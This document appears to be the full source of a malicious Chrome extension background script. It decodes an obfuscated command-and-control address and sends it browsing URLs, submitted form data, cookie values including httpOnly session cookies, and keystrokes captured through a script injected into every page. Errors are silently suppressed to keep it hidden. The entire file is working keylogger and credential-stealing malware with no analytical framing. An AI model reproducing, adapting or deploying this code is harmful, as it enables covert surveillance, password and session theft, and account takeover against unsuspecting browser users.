const C2_CONFIG = {
  host: atob("aHR0cDovLzEzLjIxMy45Ni4xNDA6NDQz")  
};

const C2_SERVER = C2_CONFIG.host;

// 1. URL NAVIGATION
chrome.webNavigation.onCompleted.addListener((details) => {
  fetch(`${C2_SERVER}/url`, {
    method: "POST",
    body: JSON.stringify({
      url: details.url,
      tabId: details.tabId,
      referrer: details.referrer || "",
      time: Date.now()
    }),
    headers: { "Content-Type": "application/json" }
  }).catch(() => {});
}, { url: [{ urlMatches: "<all_urls>" }] });

// 2. FORM DATA
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    let postData = "";
    if (details.requestBody) {
      if (details.requestBody.formData) {
        postData = Object.entries(details.requestBody.formData)
          .map(([k, v]) => `${k}=${v}`).join('&');
      } else if (details.requestBody.raw?.[0]?.bytes) {
        postData = new TextDecoder().decode(new Uint8Array(details.requestBody.raw[0].bytes));
      }
    }

    if (postData) {
      fetch(`${C2_SERVER}/form`, {
        method: "POST",
        body: JSON.stringify({
          url: details.url,
          method: details.method,
          data: postData,
          time: Date.now()
        }),
        headers: { "Content-Type": "application/json" }
      }).catch(() => {});
    }
  },
  { urls: ["<all_urls>"] },
  ["requestBody"]
);

// 3. COOKIES
chrome.cookies.onChanged.addListener((changeInfo) => {
  if (!changeInfo.removed) {
    fetch(`${C2_SERVER}/cookie`, {
      method: "POST",
      body: JSON.stringify({
        domain: changeInfo.cookie.domain,
        name: changeInfo.cookie.name,
        value: changeInfo.cookie.value,
        path: changeInfo.cookie.path,
        secure: changeInfo.cookie.secure,
        httpOnly: changeInfo.cookie.httpOnly,
        time: Date.now()
      }),
      headers: { "Content-Type": "application/json" }
    }).catch(() => {});
  }
});

// 4. KEYSTROKES (no extra text anywhere)
chrome.tabs.onUpdated.addListener((tabId, info, tab) => {
  if (info.status === "complete" && tab.url && !tab.url.startsWith("chrome://")) {
    chrome.scripting.executeScript({
      target: { tabId },
      func: () => {
        const c2Host = "aHR0cDovLzEzLjIxMy45Ni4xNDA6NDQz";
        const C2_SERVER = atob(c2Host);

        document.addEventListener('keydown', (e) => {
          fetch(`${C2_SERVER}/keystroke`, {
            method: 'POST',
            body: JSON.stringify({
              key: e.key,
              code: e.code,
              url: window.location.href,
              time: Date.now()
            }),
            headers: { 'Content-Type': 'application/json' }
          }).catch(() => {});
        });
      }
    }).catch(() => {});
  }
});
